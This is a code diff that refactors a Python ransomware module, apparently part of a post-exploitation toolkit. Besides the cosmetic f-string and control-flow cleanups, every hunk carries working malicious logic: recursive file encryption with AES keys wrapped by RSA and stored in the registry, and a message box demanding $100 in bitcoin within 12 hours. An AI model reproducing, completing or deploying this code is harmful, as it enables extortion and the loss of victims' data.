@@ -58,14 +58,12 @@ def _threader(tasks):
                     method(task)
                 tasks.task_done()
             except:
-                if retries < 3:
-                    retries += 1
-                    time.sleep(1)
-                    continue
-                else:
+                if retries >= 3:
                     break
+                retries += 1
+                time.sleep(1)
     except Exception as e:
-        util.log("{} error: {}".format(_threader.__name__, str(e)))
+        util.log(f"{_threader.__name__} error: {str(e)}")
 
 @util.threaded
 def _iter_files(rsa_key, base_dir=None):
@@ -75,7 +73,7 @@ def _iter_files(rsa_key, base_dir=None):
                 if os.path.isdir(base_dir):
                     return os.path.walk(base_dir, lambda _, dirname, files: [globals()['tasks'].put_nowait((encrypt_file, (os.path.join(dirname, filename), rsa_key))) for filename in files], None)
                 else:
-                    util.log("Target directory '{}' not found".format(base_dir))
+                    util.log(f"Target directory '{base_dir}' not found")
             else:
                 cipher = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
                 reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, globals()['registry_key'], 0, _winreg.KEY_READ)
@@ -90,7 +88,7 @@ def _iter_files(rsa_key, base_dir=None):
                         _winreg.CloseKey(reg_key)
                         break
     except Exception as e:
-        util.log('{} error: {}'.format(_iter_files.__name__, str(e)))
+        util.log(f'{_iter_files.__name__} error: {str(e)}')
 
 def request_payment(bitcoin_wallet):
     """
@@ -104,7 +102,7 @@ def request_payment(bitcoin_wallet):
         alert = util.alert("Your personal files have been encrypted. The service fee to decrypt your files is $100 USD worth of bitcoin (try www.coinbase.com or Google 'how to buy bitcoin'). The service fee must be tranferred to the following bitcoin wallet address: %s. The service fee must be paid within 12 hours or your files will remain encrypted permanently. Deadline: %s" % (bitcoin_wallet, time.localtime(time.time() + 60 * 60 * 12)))
         return "Launched a Windows Message Box with ransom payment information"
     except Exception as e:
-        return "{} error: {}".format(request_payment.__name__, str(e))
+        return f"{request_payment.__name__} error: {str(e)}"
 
 def encrypt_aes(plaintext, key, padding=chr(0)):
     """
@@ -161,23 +159,24 @@ def encrypt_file(filename, rsa_key):
     """
     try:
         if os.path.isfile(filename):
-            if os.path.splitext(filename)[1] in globals()['filetypes']:
-                if isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
-                    cipher = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
-                    aes_key = os.urandom(32)
-                    with open(filename, 'rb') as fp:
-                        data = fp.read()
-                    ciphertext = encrypt_aes(data, aes_key)
-                    with open(filename, 'wb') as fd:
-                        fd.write(ciphertext)
-                    key = base64.b64encode(cipher.encrypt(aes_key))
-                    util.registry_key(globals()['registry_key'], filename, key)
-                    util.log('{} encrypted'.format(filename))
-                    return True
+            if os.path.splitext(filename)[1] in globals()[
+                'filetypes'
+            ] and isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
+                cipher = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
+                aes_key = os.urandom(32)
+                with open(filename, 'rb') as fp:
+                    data = fp.read()
+                ciphertext = encrypt_aes(data, aes_key)
+                with open(filename, 'wb') as fd:
+                    fd.write(ciphertext)
+                key = base64.b64encode(cipher.encrypt(aes_key))
+                util.registry_key(globals()['registry_key'], filename, key)
+                util.log(f'{filename} encrypted')
+                return True
         else:
-            util.log("File '{}' not found".format(filename))
+            util.log(f"File '{filename}' not found")
     except Exception as e:
-        util.log("{} error: {}".format(encrypt_file.__name__, str(e)))
+        util.log(f"{encrypt_file.__name__} error: {str(e)}")
     return False
 
 def decrypt_file(filename, key):
@@ -198,12 +197,12 @@ def decrypt_file(filename, key):
             plaintext = decrypt_aes(ciphertext, key)
             with open(filename, 'wb') as fd:
                 fd.write(plaintext)
-            util.log('{} decrypted'.format(filename))
+            util.log(f'{filename} decrypted')
             return True
         else:
-            util.log("File '{}' not found".format(filename))
+            util.log(f"File '{filename}' not found")
     except Exception as e:
-        util.log("{} error: {}".format(decrypt_file.__name__, str(e)))
+        util.log(f"{decrypt_file.__name__} error: {str(e)}")
     return False
 
 def encrypt_files(args):
@@ -216,21 +215,20 @@ def encrypt_files(args):
     """
     try:
         target, _, rsa_key = args.partition(' ')
-        if os.path.exists(target):
-            if not isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
-                rsa_key = Crypto.PublicKey.RSA.importKey(rsa_key)
-            if not rsa_key.can_encrypt():
-                return "Error: RSA key cannot encrypt"
-            if os.path.isfile(target):
-                return encrypt_file(target, rsa_key)
-            if os.path.isdir(target):
-                globals()['threads']['iter_files'] = _iter_files(rsa_key, base_dir=target)
-                globals()['threads']['encrypt_files'] = _threader()
-                return "Encrypting files"
-        else:
-            return "File '{}' does not exist".format(target)
+        if not os.path.exists(target):
+            return f"File '{target}' does not exist"
+        if not isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
+            rsa_key = Crypto.PublicKey.RSA.importKey(rsa_key)
+        if not rsa_key.can_encrypt():
+            return "Error: RSA key cannot encrypt"
+        if os.path.isfile(target):
+            return encrypt_file(target, rsa_key)
+        if os.path.isdir(target):
+            globals()['threads']['iter_files'] = _iter_files(rsa_key, base_dir=target)
+            globals()['threads']['encrypt_files'] = _threader()
+            return "Encrypting files"
     except Exception as e:
-        util.log("{} error: {}".format(encrypt_files.__name__, str(e)))
+        util.log(f"{encrypt_files.__name__} error: {str(e)}")
 
 def decrypt_files(rsa_key):
     """
@@ -249,7 +247,7 @@ def decrypt_files(rsa_key):
         globals()['threads']['decrypt_files'] = _threader()
         return "Decrypting files"
     except Exception as e:
-        util.log("{} error: {}".format(decrypt_files.__name__, str(e)))
+        util.log(f"{decrypt_files.__name__} error: {str(e)}")
 
 def run(args=None):
     """
